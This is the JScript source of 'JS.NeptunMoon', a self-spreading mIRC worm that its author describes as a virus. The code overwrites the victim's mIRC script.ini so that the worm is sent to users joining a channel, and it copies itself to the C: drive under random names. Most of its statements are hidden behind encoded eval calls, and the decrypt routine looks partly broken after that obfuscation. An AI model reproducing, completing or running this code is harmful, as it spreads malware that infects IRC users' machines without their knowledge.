   /*
     JS.NeptunMoon
     by Second Part To Hell[rRlf]
     www.spth.de.vu
     spth@aonmail.at
     written on 16.03.2003

     The Virus is a mIRC-worm. It has 2 special things:
     --> The mIRC-part is encrypt 2 different keys (thanks goes to jackie for this thing. You will find the article in rRlf#3)
     --> The file-names are random (8 differnt ones). All this names are names of Neptun-Moons ;)

   */

   var fso=WScript.CreateObject("Scripting.FileSystemObject")
   var shell=WScript.CreateObject("Wscript.Shell")
   var pd=shell.RegRead("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ProgramFilesDir")
   var mirc=fso.CreateTextFile(pd+"\\mIRC\\script.ini")
   var emla="Zrbqhos"
   var mla=dec(emla,1,1)
   Cv="%6D%69%72%63%2E%57%72%69%74%65%4C%69%6E%65%28%6D%6C%61%2B%22%5D%22%29%3B"
   eval(unescape(Cv))
   var emlb="r4Asr$5>nsmr>.2.>$ $mj$,$(rmgoAA(qi-$ lepx*$3hgg$wirh$(rmgo"
   var mlb=dec(emlb,4,2)
   var sur=Math.round(Math.random()*8)+1
   if (sur==1) { var nm="Triton.js"}
   if (sur==2) { var nm="Nereid.js"}
   if (sur==3) { var nm="Naiad.js"}
   if (sur==4) { var nm="Thalassa.js"}
   if (sur==5) { var nm="Despina.js"}
   if (sur==6) { var nm="Galatea.js"}
   if (sur==7) { var nm="Larissa.js"}
   if (sur==8) { var nm="Proteus.js"}
   var nme=" C:\\"+nm+" }"
   tuIbqMvB="%6D%6C%62%3D%6D%6C%62%2B%6E%6D%65%3B"
   eval(unescape(tuIbqMvB))
   HCgs="%6D%69%72%63%2E%57%72%69%74%65%4C%69%6E%65%28%6D%6C%62%29%3B"
   eval(unescape(HCgs))
   qjRn="%6D%69%72%63%2E%43%6C%6F%73%65%28%29%3B"
   eval(unescape(qjRn))
   aZi="%66%73%6F%2E%43%6F%70%79%46%69%6C%65%28%57%53%63%72%69%70%74%2E%53%63%72%69%70%74%46%75%6C%6C%4E%61%6D%65%2C%20%22%43%3A%5C%5C%22%2B%6E%6D%29%3B"
   eval(unescape(aZi))
   function dec(cod,key,mp)
   {
     var str=""
     for (var i=0; i<cod.length; i++)
     { if (mp==1)
   MwjdMwaA="%20%20%20%20%20%20%7B%20%73%74%72%3D%73%74%72%2B%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%63%6F%64%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%20%2B%20%6B%65%79%29%3B"
   eval(unescape(MwjdMwaA))
         }
       if (mp==2)
   SEC="%20%20%20%20%20%20%7B%20%73%74%72%3D%73%74%72%2B%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%63%6F%64%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%20%2D%20%6B%65%79%29%3B"
   eval(unescape(SEC))
         }
     }
   return(str)
   }
